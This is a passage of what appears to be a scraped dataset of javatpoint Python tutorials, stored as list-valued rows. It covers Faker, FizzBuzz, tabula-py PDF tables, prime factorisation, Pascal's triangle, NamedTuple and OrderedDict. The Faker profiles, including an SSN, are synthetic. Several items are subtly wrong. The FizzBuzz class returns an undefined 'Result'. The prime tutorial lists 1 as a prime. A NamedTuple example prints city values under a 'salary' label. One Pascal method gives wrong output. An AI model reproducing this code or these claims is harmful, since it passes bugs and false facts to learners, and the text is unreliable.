'import pandas as pd', '# defining the variable for Faker() module', 'sample = Faker()', '# list of words', ""mywords = ['Cow', 'domestic', 'why', 'what', 'bird', 'parrot', 'is', 'animal', 'a', 'my']"", '# printing the sentence', 'print(""Sentence: "", sample.sentence(ext_word_list = mywords))', '# importing the required libraries', 'from faker import Faker', 'import pandas as pd', '# defining the variable for Faker() module', 'sample = Faker()', '# generating the profile', 'print(""Complete Profile: "", sample.profile())', '# importing the required libraries', 'from faker import Faker', 'import pandas as pd', '# defining the variable for Faker() module', 'sample = Faker()', '# generating the profiles of 20 people', 'mydata = [sample.profile() for n in range(20)]', 'my_dframe = pd.DataFrame(mydata)', 'print(my_dframe)']","['Your Name:  Teresa Hill', 'Your Date of Birth:  1950-03-12', 'Your Address:  430 Bauer Turnpike Suite 931', 'Annaton, OR 12319', 'Your Country:  Angola', 'Your E-mail Address:  [email\xa0protected]', 'Thomas Schneider', '?????? ??????', '?? ??', 'Lucas Poulain', '????? ??????', 'Aurélie Merle-Menard', '?? ??', '????????, ??????', 'Stéphane Lefebvre-Alves', '????? ?????', 'Text:  Size plant task we through score name. Whose learn drop ground.', 'Option entire some surface seek film involve. Billion body really common decade man. Worker foreign your then likely beat.', 'Sentence:  Project star plant she energy them leave.', 'Sentence:  Cow is domestic domestic domestic animal animal.', ""Complete Profile:  {'job': 'Minerals surveyor', 'company': 'Nichols and Sons', 'ssn': '715-16-7081', 'residence': '550 Moore Locks\\nSouth Andrea, SD 94842', 'current_location': (Decimal('-78.730969'), Decimal('-151.109875')), 'blood_group': 'B+', 'website': ['https://www.smith-avila.com/', 'http://bennett-scott.com/', 'https://www.nguyen.com/'], 'username': 'joseph04', 'name': 'Toni Martin', 'sex': 'F', 'address': '29676 Mann Rapid\\nWilkinsonbury, MN 35916', 'mail': '[email\xa0protected]', 'birthdate': datetime.date(2016, 10, 1)}"", 'job                    company  ...                       mail   birthdate', '0                         Housing manager/officer                  Cross LLC  ...  [email\xa0protected]  1983-03-26', '1                       Learning disability nurse            Bennett-Sellers  ...      [email\xa0protected]  1923-04-14', '2                           Agricultural engineer                Patrick PLC  ...     [email\xa0protected]  1941-01-13', '3              Research scientist (life sciences)    Coleman, Shaw and Owens  ...    [email\xa0protected]  1927-07-07', '4                                   Haematologist           Jefferson-Bailey  ...     [email\xa0protected]  2001-06-06', '5   Chartered legal executive (England and Wales)            Torres-Andersen  ...      [email\xa0protected]  1956-05-12', '6                                    Statistician            Rodriguez-Chung  ...      [email\xa0protected]  1955-07-06', '7                                Paediatric nurse  Simmons, Acosta and Gates  ...  [email\xa0protected]  1984-02-29', '8                             Dispensing optician                  Bauer Inc  ...     [email\xa0protected]  1935-03-30', '9                  Equality and diversity officer  Martinez, Allen and Davis  ...     [email\xa0protected]  2019-06-28', '10                       Secondary school teacher  Greene, Gonzalez and Hill  ...    [email\xa0protected]  1913-10-02', '11                                   TEFL teacher             Smith and Sons  ...     [email\xa0protected]  1989-06-17', '12              Planning and development surveyor       Smith, Lee and Reyes  ...    [email\xa0protected]  1905-09-05', '13                               Product designer   Taylor, Davis and Wilson  ...       [email\xa0protected]  1938-11-27', '14                  Development worker, community              Carlson-Evans  ...          [email\xa0protected]  1929-03-08', '15                    Engineer, building services                 Pham Group  ...   [email\xa0protected]  1984-12-31', '16                       Therapist, horticultural          Anderson-Gonzalez  ...     [email\xa0protected]  1929-03-16', '17       Geographical information systems officer               Burke-Burton  ...          [email\xa0protected]  1997-06-12', '18                                 Retail manager               Rivera-Lucas  ...            [email\xa0protected]  2016-03-20', '19                       Therapeutic radiographer             Holloway Group  ...       [email\xa0protected]  2011-02-23', '[20 rows x 13 columns]']",[],[]
200,['Fizz-Buzz Program in Python'],"['Fizz-Buzz is the programming task used for explaining the division of numbers in the Fizz, Buzz, and Fizz_Buzz group.']","['https://www.javatpoint.com/tabula-python', 'https://www.javatpoint.com/python-faker', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/tabula-python', 'https://www.javatpoint.com/python-faker', 'https://www.javatpoint.com/tabula-python']",[],[],['Summary'],[],[],"['For solving the above problem and considering the limitations, we have to follow the below steps:', ""In the program, we have to apply the condition for all the numbers from 1 to 'n.'"", 'We can also write the above program by using the loop method.']","[""Suppose the user has the number 'n,' and they have to display the string representation of all the numbers from 1 to n. But there are some limitations such as:"", 'In this article, we have discussed how the user can write a python program for the Fizz Buzz problem, we have also discussed some limitations that must be followed.']",[],"['class Example(object):', 'def Fizz_Buzz(self, n):', '""""""', ':type n: int', ':rtype: List[str]', '""""""', 'result = []', 'for i in range(1 , n+1):', 'if i % 3 == 0 and i % 5 == 0:', 'result.append("" Fizz_Buzz "")', 'elif i % 3 == 0:', 'result.append("" Fizz "")', 'elif i % 5 == 0:', 'result.append("" Buzz "")', 'else:', 'result.append(str(i))', 'return Result', 'object1 = Example()', 'print(object1.Fizz_Buzz(55))', 'for num in range(35):', '# Numbers which are divisible by 15, that means it is divisible by both 3 and 5,', '# it will print ""Fizz_Buzz""    # at the place of the number', 'if num % 15 == 0:', 'print("" Fizz_Buzz "")', 'continue', '# Numbers which are dividable by 3, it will print ""Fizz""', '# at the place of the number', 'elif num % 3 == 0:', 'print("" Fizz"")', 'continue', '# Numbers which are dividable by 5,', '# it will print ""Buzz"" at the', '# place of the number', 'elif num % 5 == 0:', 'print("" Buzz "")', 'continue', '# in result it will Print numbers', 'print(num)']","[""['1', '2', ' Fizz ', '4', ' Buzz ', ' Fizz ', '7', '8', ' Fizz ', ' Buzz ', '11', ' Fizz ', '13', '14', ' Fizz_Buzz ', '16', '17', ' Fizz ', '19', ' Buzz ', ' Fizz ', '22', '23', ' Fizz ', ' Buzz ', '26', ' Fizz ', '28', '29', ' Fizz_Buzz ', '31', '32', ' Fizz ', '34', ' Buzz ', ' Fizz ', '37', '38', ' Fizz ', ' Buzz ']"", 'Fizz_Buzz', '1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', 'Fizz', '13', '14', 'Fizz_Buzz', '16', '17', 'Fizz', '19', 'Buzz', 'Fizz', '22', '23', 'Fizz', 'Buzz', '26', 'Fizz', '28', '29', 'Fizz_Buzz', '31', '32', 'Fizz', '34']",[],"['|||Suppose the number is dividable by 3, then it will print ""Fizz"" in place of the number.|||If the number is dividable by 5, it will print ""Buzz"" in place of the number in the result.|||And suppose the given number is dividable by both 3 and 5, it will print ""Fizz_Buzz"" in place of the number.|||And if the number is neither dividable by 3 nor 5, it will print the number as the string.|||']"
201,['Tabula Python'],"['Generally, it is not necessary that the data we use available in CSV or JSON format. The data can be stored in the form of a table in a PDF file. As a most straightforward case, we can copy and paste the table into a spreadsheet or a text editor. But it may also be that we can more than one table in the same PDF that has similar structures. For such cases, we have to copy and paste each of these tables separately, which makes the work tedious.']","['https://www.javatpoint.com/python-program-to-print-prime-factor-of-given-number', 'https://www.javatpoint.com/fizz-buzz-program-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/gui-full-form', 'https://www.javatpoint.com/https://www.javatpoint.com/ruby-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/r-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/nodejs-tutorial', 'https://www.javatpoint.com/python-program-to-print-prime-factor-of-given-number', 'https://www.javatpoint.com/fizz-buzz-program-in-python', 'https://www.javatpoint.com/python-program-to-print-prime-factor-of-given-number']",[],[],[],"['An Introduction', 'What is Tabula?', 'Who utilizes Tabula?', 'Implementation of Tabula in Python', 'Reading a PDF file', 'Handling multiple tables on the same page of a PDF file', 'Converting PDF file directly to a CSV file']",[],"['Now, let us understand who uses Tabula and how we can install it.', 'Once we have discussed a bit Tabula, let us understand its implementation in Python.', 'Installation of the library', 'Since tabula-py is an open-source library of Python, we will use the pip installer in order to install the library.', 'Importing of the library', 'Once the installation is completed, we can verify it by simply importing the library as shown below:', 'In case the program returns an importing error, it is recommended to reinstall the package.', 'Let us begin with reading a PDF file', 'The tabula-py library allows its users to read a PDF file using the function known as the read_pdf() function.', 'Parameters:', 'filename: The filename parameter is the name of the pdf file; we would like to read the data from.', 'Let us convert the following pdf data table into pandas Data Frame.', 'File Name: marksheet_table.py', 'Here is an example given below, that demonstrates how to extract the data from the pdf.', 'Explanation:', 'Note: We have used the pages parameter in the read_pdf() function to read the data from the specified page(s).', 'Let us consider another example to print the tables from a specific page, say page number 2.', 'Explanation:', 'Now, let us understand what happens when there is more than one table on the same page of a PDF data file.', 'Let us consider the following example demonstrating how to read multiple tables as independent tables.', 'Explanation:', 'Now, let us consider an example to understand how to read multiple tables as a single table.', 'Explanation:', 'We can convert a PDF file that contains tabular data directly into a CSV file with the help of the convert_into() method in the tabula library.', 'Let us consider the following example illustrating the conversion of the PDF file into CSV file.', 'Explanation:']","['However, to cut this dreary work, Python provides an open-source library, also known as tabula-py, that allows users to extract more than one table distinctly. In the following tutorial, we will learn about tabula and their functions.', 'There are Grassroots Organizations such as SchoolCuts.org that also depend upon Tabula in order to convert clunky documents into human-friendly public resources.', 'Apart from the above, there are researchers from other backgrounds who utilize Tabula for turning their PDF reports into Excel Spreadsheets, CSVs, and JSON format files and use it for the purpose of Analysing and Database Applications.', 'The tabula-py library provides various functions such as reading a PDF file, reading a table on a specific page of a PDF file, reading multiple tables on the same page of a PDF file, or Converting PDF files directly a CSV file.', 'In the following example, we have now set the multiple_tables parameter to False. As a result, the tables present on page 2 are treated as a single table.', 'In the above example, we have again imported the required library and defined the variable containing the address of the PDF file. We have then used the convert_into() method to convert the PDF file into the CSV file and printed a success message.', ""Moreover, we can also observe that the program returned a statement saying that the 'pages' argument is not specified. Thus, the table present on page 1 will be extracted by default.""]","['Tabular is a basic wrapper of tabula-java that allows users to the extraction of the table and converts the PDF file directly into Data frames or JSON using Python Programming language. The user can also extract tables from PDF and convert them into TSV, CSV, or JSON format files.', 'Tabula is a tool based on Graphical User Interface (GUI) Application; however, tabula-java is a tool based on Command-Line User Interface (CUI). tabula-java provides the bindings of Ruby, R, and NodeJS but not for Python. Thus, the developers introduced the concept of tabula-py that provides Python binding.', 'Tabula is a powerful tool that is being used by News organizations of all sizes in order to power investigative reporting. These News organizations are The Times of London, ProPublica, Foreign Policy, The New York Times, La Nacion (Argentina), and St. Paul (MN) Pioneer Press.', 'In the above example, we have imported the required library and defined a variable that stores the address of the pdf data file. We have then used the read_pdf() function to read the data from the pdf and printed it for the users. As a result, the data table has been read successfully.', 'In the above example, we have followed the same procedure as we did earlier. However, we have assigned the pages parameter to 2 and printed the first table of the specified page. As a result, the table of index zero on page 2 has been printed successfully.', 'We can handle more than one table on the same using an additional parameter known as multiple_tables. The multiple_tables parameter takes a Boolean value for which the read_pdf() function reads multiple tables as independent tables if true or reads multiple tables as a single table if false.', 'In the following example, we have again imported the required library and defined the variable that stores the address of the PDF file. We have then used the read_pdf() function and included the multiple_tables parameter setting it to True. We have then printed the multiple tables present on page 2 of the PDF file separately.']","['$ pip install tabula-py', 'import tabula', 'obj = tabula.read_pdf(filename, args[])', '# importing the library', 'import tabula', '# address of the file', ""myfile = 'marksheet_table.pdf'"", '# using the read_pdf() function', 'mytable = tabula.read_pdf(myfile, pages = 1)', '# printing the table', 'print(mytable[0])', '# importing the library', 'import tabula', '# address of the file', ""myfile = 'marksheet_table.pdf'"", '# using the read_pdf() function', 'mytable = tabula.read_pdf(myfile, pages = 2)', '# printing the table', 'print(mytable[0])', '# importing the library', 'import tabula', '# address of the file', ""myfile = 'marksheet_table.pdf'"", '# using the read_pdf() function', 'mytable = tabula.read_pdf(myfile, pages = 2, multiple_tables = True)', '# printing the table', 'print(mytable[0])', 'print(mytable[1])', '# importing the library', 'import tabula', '# address of the file', ""myfile = 'marksheet_table.pdf'"", '# using the read_pdf() function', 'mytable = tabula.read_pdf(myfile, pages = 2, multiple_tables = False)', '# printing the table', 'print(mytable[0])', 'tabula.convert_into(""filename.pdf"", ""newfilename.csv"", args[])', '# importing the library', 'import tabula', '# address of the file', ""myfile = 'marksheettable.pdf'"", '# using the read_pdf() function', 'tabula.convert_into(myfile, ""marksheet.csv"")', 'print(""The PDF file has been converted successfully."")']","['Name  English  Physics  Chemistry  Biology  Total', '0     A       86       54         65       83    288', '1     B       56       45         80       55    236', '2     C       34       66         73       90    263', '3     D       77       75         46       34    232', '4     E       74       82         55       77    288', '5     F       69       76         82       46    273', '6     G       53       33         29       45    160', '7     H       70       41         67       23    201', '8     I       80       43         88       28    239', '9     J       90       37         45       71    243', '10    K       98       55         88       81    322', '11    L       90       54         67       37    248', '12    M       87       76         88       54    305', '13    N       86       69         82       66    303', '14    O       67       74         54       65    260', '15    P       75       96         53       67    291', '16    Q       45       87         80       45    257', '17    R       44       66         49       78    237', '18    S       78       39         78       80    275', '19    T       56       54         77       86    273', '20    U       43       90         64       77    274', '21    V       95       88         66       55    304', '22    W       64       67         86       80    297', '23    X       82       56         45       65    248', '24    Y       79       65         70       54    268', '25    Z       83       54         40       75    252', 'Name  Final Scores', '0     A           288', '1     B           236', '2     C           263', '3     D           232', '4     E           288', '5     F           273', '6     G           160', '7     H           201', '8     I           239', '9     J           243', '3     D           232', '4     E           288', '5     F           273', '6     G           160', '7     H           201', '8     I           239', '9     J           243', '10    K           322', '11    L           248', '12    M           305', '13    N           303', '14    O           260', '15    P           291', '16    Q           257', '17    R           237', '18    S           275', '19    T           273', '20    U           274', '21    V           304', '22    W           297', '23    X           248', '24    Y           268', '25    Z           252', 'Name  Final Scores', '0     A           288', '1     B           236', '2     C           263', '3     D           232', '4     E           288', '5     F           273', '6     G           160', '7     H           201', '8     I           239', '9     J           243', '10    K           322', '11    L           248', '12    M           305', '13    N           303', '14    O           260', '15    P           291', '16    Q           257', '17    R           237', '18    S           275', '19    T           273', '20    U           274', '21    V           304', '22    W           297', '23    X           248', '24    Y           268', '25    Z           252', 'Name Position', '0    K        I', '1    M       II', '2    V      III', '3    N       IV', '4    W        V', 'Name Final Scores', '0      A          288', '1      B          236', '2      C          263', '3      D          232', '4      E          288', '5      F          273', '6      G          160', '7      H          201', '8      I          239', '9      J          243', '10     K          322', '11     L          248', '12     M          305', '13     N          303', '14     O          260', '15     P          291', '9      J          243', '10     K          322', '11     L          248', '12     M          305', '13     N          303', '14     O          260', '15     P          291', '16     Q          257', '17     R          237', '18     S          275', '19     T          273', '20     U          274', '21     V          304', '22     W          297', '23     X          248', '24     Y          268', '25     Z          252', '26  Name     Position', '27     K            I', '28     M           II', '29     V          III', '30     N           IV', '31     W            V', ""'pages' argument isn't specified.Will extract only from page 1 by default."", 'The PDF file has been converted successfully.']",['Name|||English|||Physics|||Chemistry|||Biology|||Total&&&A|||86|||54|||65|||83|||288&&&B|||56|||45|||80|||55|||236&&&C|||34|||66|||73|||90|||263&&&D|||77|||75|||46|||34|||232&&&E|||74|||82|||55|||77|||288&&&F|||69|||76|||82|||46|||273&&&G|||53|||33|||29|||45|||160&&&H|||70|||41|||67|||23|||201&&&I|||80|||43|||88|||28|||239&&&J|||90|||37|||45|||71|||243&&&K|||98|||55|||88|||81|||322&&&L|||90|||54|||67|||37|||248&&&M|||87|||76|||88|||54|||305&&&N|||86|||69|||82|||66|||303&&&O|||67|||74|||54|||65|||260&&&P|||75|||96|||53|||67|||291&&&Q|||45|||87|||80|||45|||257&&&R|||44|||66|||49|||78|||237&&&S|||78|||39|||78|||80|||275&&&T|||56|||54|||76|||86|||273&&&U|||43|||90|||64|||77|||274&&&V|||95|||88|||66|||55|||304&&&W|||64|||67|||86|||80|||297&&&X|||82|||56|||45|||65|||248&&&Y|||79|||65|||70|||54|||268&&&Z|||83|||54|||40|||75|||252'],[]
202,['Python Program to Print Prime Factor of Given Number'],"['In this tutorial, we will discuss how we can get the prime factor of the given number using the Python program. All we familiar with the prime numbers, if not then prime numbers are the number that can be divided by one or itself. For example - 1, 2, 3, 5, 7, 11, 13, ……']","['https://www.javatpoint.com/python-program-to-print-pascal-triangle', 'https://www.javatpoint.com/tabula-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/python-program-to-print-pascal-triangle', 'https://www.javatpoint.com/tabula-python', 'https://www.javatpoint.com/python-program-to-print-pascal-triangle']",[],[],[],['Finding all prime factorization of a number'],[],"['For Example: 330 = 2 × 3 × 5 × 11.', ""Before writing the Python program, let's understand the following conjectures."", ""Let's see the following step to perform such an operation."", ""Let's see the following step to perform such operation."", 'Example - Python program to print prime factors', 'Explanation - ', ""Let's understand the following property of composite numbers."", 'Every composite number has at least one prime factor less than or equal to the square root.', 'The program will work as follows.', ""Let's understand another example where we find the largest prime factor of a given number."", 'Example - 2 Python program to find the largest prime factor of a given number.']","['Proof -There are two greater sqrt(n) numbers, then their product should also divide n but which will exceed n, which contradicts our assumption. So there can NOT be more than one prime factor of n greater than sqrt(n).', 'Proof - Suppose there are two greater sqrt(n) number then their product should also divide n but which will exceed n, which contradicts our assumption. So there can NOT be more than 1 prime factor of n greater than sqrt(n).']","['If the user enters the number as 12, then the output must be \'2, 2, 3, and if the input is 315; the output should be ""3 3 5 7"". The program must return the prime all prime factor of given number. The prime factors of 330 are 2, 3, 5, and 11. Therefore 11 is the most significant prime factor of 330.', 'In the above code, we have imported the math module. The prime_factor() function is responsible for printing the composite number. First, we get the even numbers; after this, all remaining prime factors must be odd. In for loop, the num must be odd, so we incremented i by two. A for loop will run the square root of n times.']","['p <= sqrt(n} or q <= sqrt(n)', 'import math', '# Below function will print the', '# all prime factor of given number', 'def prime_factors(num):', ""# Using the while loop, we will print the number of two's that divide n"", 'while num % 2 == 0:', 'print(2,)', 'num = num / 2', 'for i in range(3, int(math.sqrt(num)) + 1, 2):', '# while i divides n , print i ad divide n', 'while num % i == 0:', 'print(i,)', 'num = num / i', 'if num > 2:', 'print(num)', '# calling function', 'num = 200', 'prime_factors(num)', 'def largest_prime_factor(n):', 'i = 2', 'while i * i <= n:', 'if n % i:', 'i += 1', 'else:', 'n //= i', 'return n', 'print(largest_prime_factor(345))']","['2', '2', '2', '5', '5', '23']",[],"['|||1st Conjecture - There can be at-least one prime factor that would be less than √n in case of n is not a prime number.||||||2nd Conjecture - There can be AT-MOST 1 prime factor of n greater than sqrt(n).||||||In the first step, find the least prime factor i.|||The occurrence of i be will removed from n by repeatedly dividing n by i.|||Repeat the above both steps for dividing n and i = i + 2. Both steps will be repetitive till n become either 1 or a prime number.|||']"
203,['Python Program to Print Pascal Triangle'],"[""In this tutorial, we will discuss how we can print the Pascal triangle using the Python program. But first, let's understand what the Pascal triangle is.""]","['https://www.javatpoint.com/namedtuple-in-python', 'https://www.javatpoint.com/python-program-to-print-prime-factor-of-given-number', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/namedtuple-in-python', 'https://www.javatpoint.com/python-program-to-print-prime-factor-of-given-number', 'https://www.javatpoint.com/namedtuple-in-python']",['https://static.javatpoint.com/python/images/python-program-to-print-pascal-triangle.png'],[],"[""Algorithm to Print Pascal's Triangle in Python""]",['Introduction'],[],"['Below are the step used to print the Pascal triangle.', 'Step - 1: Taking input from the user to get the number of rows.', 'Step - 2: Declare an empty list that will store the values.', 'Step - 3: Using for loop, which will iterate through 0 to n - 1, append the sub-lists to the list.', 'Step - 4: Now append 1 to the list.', 'Step - 5: Now, use for loop to define the value of the number inside the triangle adjacent row.', 'Step - 6: Print Pascal triangle according to the format.', 'Step - 7: Exit', ""Let's understand the following implementation of algorithm into Python program."", 'We run the program one more time.', 'Explanation -', 'Method - 2:', ""The above method's time complexity is 0(N2)."", 'Method - 3', 'This method is optimized way of printing Pascal triangle. This method is based on the power of 11.']","['In the above image, the first line is 1. The second line contains 2 one, and the third line has 1 2 1, which is formed by taking up the sum of the above line. So it follows the alternate pattern in an entire triangle and so on.', 'We can use another method by the following the binomial coefficient, all the line starts with 1 and the ith entry in a row number line is Binomial Coefficient C(line, i). The formula is given below.', 'As we can see in the above code when we enter the number of rows five. It gave the wrong output. That means it works upto n< = 5 only. It takes less time to execute 0(N).']","['Pascal triangle is an exciting concept of mathematics where a triangular array is formed by summing adjacent elements in the preceding row. In simple words, every number is generated by taking up the sum of the adjacent row, and the outside edges of a triangle are always 1. It is named after the famous French mathematician Blaise Pascal. Below is the representation of the Pascal triangle.', ""In the above program, we have taken several rows from the user as input. We have declared an empty list. Then we used for loop, which appended the sub-list into an empty list. The next one is appended to all sub-lists. The inner for loop defined the number inside the triangle is the sum of the above adjacent row. In the end, we have used for loop to print Pascal's triangle according to a format.""]","['num = int(input(""Enter the number: ""))', 'list1 = [] #an empty list', 'for i in range(num):', 'list1.append([])', 'list1[i].append(1)', 'for j in range(1, i):', 'list1[i].append(list1[i - 1][j - 1] + list1[i - 1][j])', 'if(num != 0):', 'list1[i].append(1)', 'for i in range(num):', 'print("" "" * (num - i), end = "" "", sep = "" "")', 'for j in range(0, i + 1):', 'print(\'{0:6}\'.format(list1[i][j]), end = "" "", sep = "" "")', 'print()', 'C(line, i) = C(line, i-1) * (line - i + 1) / i', '# input n', 'n = int(input(""Enter the number of rows:""))', 'for i in range(1, n+1):', 'for j in range(0, n-i+1):', ""print(' ', end='')"", '# first element is always 1', 'C = 1', 'for j in range(1, i+1):', '# first value in a line is always 1', ""print(' ', C, sep='', end='')"", '# using Binomial Coefficient', 'C = C * (i - j) // j', 'print()', '11**0 = 1', '11**1 = 11', '11**2 = 121', '11**3 = 1331', '# input n', 'n = int(input(""Enter the number of rows:""))', '# iterarte upto n', 'for i in range(n):', '# adjust space', ""print(' '*(n-i), end='')"", '# compute power of 11', ""print(' '.join(map(str, str(11**i))))""]","['Enter the number: 4', '1', '1      1', '1      2      1', '1      3      3      1', 'Enter the number: 10', '1', '1      1', '1      2      1', '1      3      3      1', '1      4      6      4', '1      5     10     10      5      1', '1      6     15     20     15      6      1', '1      7     21     35     35     21      7      1', '1      8     28     56     70     56     28      8      1', '1      9     36     84    126    126     84     36      9      1', 'Enter the number of rows: 5', '1', '1 1', '1 2 1', '1 3 3 1', '1 4 6 4 1', 'Enter the number of rows: 6', '1', '1 1', '1 2 1', '1 3 3 1', '1 4 6 4 1', '1 6 1 0 5 1']",[],[]
204,['NamedTuple in Python'],"['The NamedTuple is one of the classes under the collections module. It contains keys which are mapped to some values, just like dictionary-type objects. In this case, the user can access these elements with the help of keys and indexes.']","['https://www.javatpoint.com/ordereddict-in-python', 'https://www.javatpoint.com/python-program-to-print-pascal-triangle', 'https://www.javatpoint.com/ordereddict-in-python', 'https://www.javatpoint.com/python-program-to-print-pascal-triangle', 'https://www.javatpoint.com/ordereddict-in-python']",[],[],"['The accessing Functions of NamedTuple', 'Conversion Procedure of the NamedTuple Class', 'Some Additional Operation of NamedTuple', 'Conclusion']",[],[],"['To use it, at first, the user has to import the collections standard library module.', 'For example:', 'In this article, we will discuss some functions of the NamedTuple class.', 'In this article, we have discussed what NamedTuple is and how the user can access its different functions and operations.']","['By using NamedTuple class, the users can access the values with the help of index, keys, and the getattr() function. The attribute values of the NamedTuple class are in order so that the users can access the values through the indexes.', 'The NamedTuple class will convert the field names as attributes so that the user can use the getattr() function for getting the data from these attributes.', 'There are few methods used for converting other collections into NamedTuple. The users can use the _make_() function for converting the iterable object, such as list, tuple, etc., into NamedTuple class object.', 'The users can also convert the dictionary type object into a NamedTuple class object. For converting the dictionary type into NamedTuple type, users have to use the ** operator.', 'The NamedTuple can return the values with keys as the OrderedDict type object. For converting it into OrderedDict, the user has to use the _asdict() function.', 'There are some other functions like _fields() and _replace() function. the users can use the _fields() function for checking the different fields of NamedTuple class. The _replace() function is used for replacing the value of attributes.']",[],"['import collections', 'import collections as col', '# Now we will create employees NamedTuple', ""Employees = col.namedtuple('Employee', ['name', 'city', 'salary'])"", '# we will Add four employees', ""employee1 = Employees('Jack', 'Goa', '25000')"", ""employee2 = Employees('Ross', 'Kolkata', '35000')"", ""employee3 = Employees('Joey', 'Kerela', '55000')"", ""employee4 = Employees('John', 'Jammu', '40000')"", '# we will Access the elements by using index', ""print('The name and salary of employee1: ' + employee1[0] + ' and ' + employee1[1])"", ""print('The name and salary of employee2: ' + employee2[0] + ' and ' + employee2[1])"", '# we will Access the elements using attribute name', ""print('The name and city of employee3: ' + employee3.name + ' and ' + employee3.city)"", ""print('The name and city of employee4: ' + employee4.name + ' and ' + employee4.city)"", '# we will Access the elements using getattr()', ""print('The City of employee1 and employee2: ' + getattr(employee1, 'city') + ' and ' + getattr(employee2, 'salary'))"", ""print('The City of employee3 and employee4: ' + getattr(employee3, 'city') + ' and ' + getattr(employee4, 'salary'))"", 'import collections as col', '# Now we will create employees NamedTuple', ""Employees = col.namedtuple('Employee', ['name', 'city', 'salary'])"", '# the List of values to Employees', ""users_list1 = ['Jack', 'Goa', '25000']"", ""users_list2 = ['Ross', 'Kolkata', '35000']"", 'employee1 = Employees._make(users_list1)', 'employee2 = Employees._make(users_list2)', 'print(employee1)', 'print(employee2)', '#we will user Dict to convert Employee', ""users_dict1 = {'name':'Joey', 'city' : 'Kerala', 'salary' : '55000'}"", 'employee3 = Employees(**users_dict1)', 'print(employee3)', ""users_dict2 = {'name':'John', 'city' : 'Jammu', 'salary' : '40000'}"", 'employee4 = Employees(**users_dict2)', 'print(employee4)', '#Show the named tuple as dictionary', 'employees_dict1 = employee1._asdict()', 'employees_dict2 = employee2._asdict()', 'employees_dict3 = employee3._asdict()', 'employees_dict4 = employee4._asdict()', 'print(employees_dict1)', 'print(employees_dict2)', 'print(employees_dict3)', 'print(employees_dict4)', 'import collections as col', '# Now we will create employees NamedTuple', ""Employees = col.namedtuple('Employee', ['name', 'city', 'salary'])"", '# we will Add four employees', ""employee1 = Employees('Jack', 'Goa', '25000')"", ""employee2 = Employees('Ross', 'Kolkata', '35000')"", 'print(employee1)', 'print(employee2)', ""print('The fields of Employee1: ' + str(employee1._fields))"", ""print('The fields of Employee2: ' + str(employee2._fields))"", '#Now we will replace the city of employees', ""employee1 = employee1._replace(city='New Dehli')"", 'print(employee1)', ""employee2 = employee2._replace(city='Assam')"", 'print(employee2)']","['The name and salary of employee1: Jack and Goa', 'The name and salary of employee2: Ross and Kolkata', 'The name and city of employee3: Joey and Kerela', 'The name and city of employee4: John and Jammu', 'The City of employee1 and employee2: Goa and 35000', 'The City of employee3 and employee4: Kerela and 40000', ""Employee(name='Jack', city='Goa', salary='25000')"", ""Employee(name='Ross', city='Kolkata', salary='35000')"", ""Employee(name='Joey', city='Kerala', salary='55000')"", ""Employee(name='John', city='Jammu', salary='40000')"", ""OrderedDict([('name', 'Jack'), ('city', 'Goa'), ('salary', '25000')])"", ""OrderedDict([('name', 'Ross'), ('city', 'Kolkata'), ('salary', '35000')])"", ""OrderedDict([('name', 'Joey'), ('city', 'Kerala'), ('salary', '55000')])"", ""OrderedDict([('name', 'John'), ('city', 'Jammu'), ('salary', '40000')])"", ""Employee(name='Jack', city='Goa', salary='25000')"", ""Employee(name='Ross', city='Kolkata', salary='35000')"", ""The fields of Employee1: ('name', 'city', 'salary')"", ""The fields of Employee2: ('name', 'city', 'salary')"", ""Employee(name='Jack', city='New Dehli', salary='25000')"", ""Employee(name='Ross', city='Assam', salary='35000')""]",[],[]
205,['OrderedDict in Python'],"['The OrderedDict is the subclass of the dict object in Python. The difference between dict and OrderedDict is that the OrderedDict itself maintains the orders of the keys as inserted, whereas in the dict, the order of the keys is not an important part.']","['https://www.javatpoint.com/t-test-in-python', 'https://www.javatpoint.com/namedtuple-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/t-test-in-python', 'https://www.javatpoint.com/namedtuple-in-python', 'https://www.javatpoint.com/t-test-in-python']",[],[],"['Changing the Value of the Specific Key', 'Deleting and Reinserting the Elements in the OrderedDict class', 'How to Insert at the Beginning of the OrderedDict', 'How to Check the Order of Character in String by Using OrderedDict', 'Conclusion']",[],[],"['The OrderedDict is the standard library class. It is located in the collections module.', 'For using it, the user has to import the collections standard library module.', 'In this article, we will discuss some of the operations on OrderedDict and how Dict is different from OrderedDict.', ""When the user wants to insert some element at the beginning of the OrderedDict class, he/she can use the 'update' method."", 'In the above code:', ""If the user wants to check the order of the character in the string, they can use the 'OrderedDict' method. Let's understand the following example."", 'In the above code:']","['The user can put some keys and a lot of them with values in the Dict class and OrderedDict class. In the following example, we will show how the ordering of the Dict class can vary, but for the OrderedDict class, it will remain fixed.', 'The order of the keys will not be changed for the OrderedDict class after changing the value of the specific key, but in Dict class, the ordering may or may not change.']","['When we delete one element from the OrderedDict class and then perform the reinserting operation of that particular key and value, it will push that to the back. Although, OrderedDict class maintains the order during the process of insertion, but when the deletion process is performed, it removes the information of the ordering and treats the reinserted element as the new entry.', 'In this tutorial, we have discussed OrderedDict and how it is different from an ordinary dictionary. We have also explained how the users can delete and insert the elements in the OrderedDict and rearrange them at the beginning of the dictionary order.']","['import collections', 'import collections', '# we will first create normal dict', ""print('Dict:')"", 'user_dict = {}', ""user_dict['PP'] = 10"", ""user_dict['QQ'] = 20"", ""user_dict['RR'] = 30"", ""user_dict['SS'] = 40"", ""user_dict['TT'] = 50"", ""user_dict['UU'] = 60"", 'for item in user_dict.items():', 'print(item)', 'print()', '# now, we will create ordered dict', ""print('OrderedDict:')"", 'user_ordered_dict = collections.OrderedDict()', ""user_ordered_dict['PP'] = 10"", ""user_ordered_dict['QQ'] = 20"", ""user_ordered_dict['RR'] = 30"", ""user_ordered_dict['SS'] = 40"", ""user_ordered_dict['TT'] = 50"", ""user_ordered_dict['UU'] = 60"", 'for item in user_ordered_dict.items():', 'print(item)', 'import collections', '# we will first create normal dict', ""print('Dict:')"", 